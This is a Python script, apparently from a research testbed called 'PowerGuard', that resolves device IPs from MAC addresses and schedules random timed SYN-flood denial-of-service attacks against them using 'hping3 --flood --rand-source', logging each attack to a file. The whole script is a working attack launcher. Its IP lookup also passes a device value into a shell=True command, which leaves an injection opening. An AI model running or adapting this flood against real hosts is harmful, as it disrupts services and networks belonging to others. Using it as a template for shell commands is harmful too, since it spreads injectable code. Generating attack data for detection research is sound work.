import random
import time
import datetime
import datetime
import subprocess
import os

# List of devices with their IPs

devices = {
     'device1': 'mac1',
     'device2': 'mac2',
      ...
    }



def fix_mac_address(mac_address):
    parts = mac_address.split(':')
    fixed_parts = []

    for part in parts:
        if len(part) == 1:
            fixed_part = '0' + part
        else:
            fixed_part = part
        fixed_parts.append(fixed_part)

    return ':'.join(fixed_parts)


def getIp(device):

   command = f"ip neighbor | grep -i {fix_mac_address(devices[device])} | cut -d' ' -f1"

   # Execute the command and capture the output
   output = subprocess.check_output(command, shell=True)

   # Decode the output and store the IP address in a variable
   ip_address = output.decode("utf-8").strip()

   return ip_address




# Function to log attack details
def log_attack(start_time, end_time, state, device):
    log_file = f".../PowerGuard/code/logs/log_attacks/{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"

    # Check if log file exists; if not, create it and write the header
    if not os.path.exists(log_file):
        with open(log_file, "w") as file:
            file.write("     Start Time     |      End Time       |  State   |    Device     \n")
            file.write("--------------------|---------------------|----------|---------------\n")
    
    # Write the log entry
    with open(log_file, "a") as file:
        file.write(f"{start_time.strftime('%Y-%m-%d %H:%M:%S')} | {end_time.strftime('%Y-%m-%d %H:%M:%S')} |    {state}   | {device}\n")

# Function to schedule an attack
def schedule_attack(device, ip, start_time, duration):
    print(f"Scheduling attack on {device} at {start_time.strftime('%Y-%m-%d %H:%M:%S')} for {duration} minutes.")

    # Calculate the end time of the attack
    end_time = start_time + datetime.timedelta(seconds=duration)

    # Schedule the attack to start at start_time
    time.sleep((start_time - datetime.datetime.now()).total_seconds())

    # Start the attack
    print(f"Starting attack on {device}...")
    subprocess.run(["sudo", "hping3", "-c", "12000", "-d", "120", "-S", "-w", "64", "-p", "80", "--flood", "--rand-source", ip])

    # Log the attack details
    log_attack(start_time, end_time, "DoS", device)

# Main function to schedule 8 random attacks
# Ramndom time intervals and durations
def main():
    time_window = 24 # in hours, choose accordingly. 
    attacks = 8 # change to vary the number of injected attacks
    day_start = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    day_end = day_start + datetime.timedelta(hours=time_window)

    for _ in range(attacks):
        device = random.choice(list(devices.keys()))
        ip = getIp(device)
        attack_duration = random.randint(60, 120)  # Attack duration between 1 and 2 minutes
        attack_time = day_start + datetime.timedelta(seconds=random.randint(0, 3600*time_window))

        # Ensure attack_time is in the future
        if attack_time < datetime.datetime.now():
            attack_time = datetime.datetime.now() + datetime.timedelta(seconds=random.randint(0, 3600))

        # Schedule the attack
        schedule_attack(device, ip, attack_time, attack_duration)

if __name__ == "__main__":
    main()
